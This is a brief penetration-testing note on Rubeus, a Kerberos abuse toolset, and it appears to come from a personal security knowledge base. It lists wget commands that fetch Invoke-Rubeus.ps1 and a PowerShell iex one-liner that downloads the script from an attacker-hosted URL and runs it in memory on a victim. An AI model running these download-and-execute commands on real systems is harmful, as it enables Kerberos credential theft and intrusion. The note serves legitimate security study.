
> [!info]
> This note is still in development.
## Overview
---
**Rubeus** is a  robust C# toolset for raw Kerberos interaction and abuses.

## Usage
---
### Common Commands

- Find here: https://github.com/blackhatethicalhacking/Rubeus#command-line-usage

### Rubeus in Memory

```shell
# Download Rubeus to Attacker
wget https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Rubeus.ps1
# OR
wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1

# Host on Web Server
```

```powershell
# On Victim: Load into Session
iex ([System.Net.WebClient]::new().DownloadString('<url>/Invoke-Rubeus.ps1'))

# Usage
Invoke-Rubeus -Command "<rubeus_arguments>"
```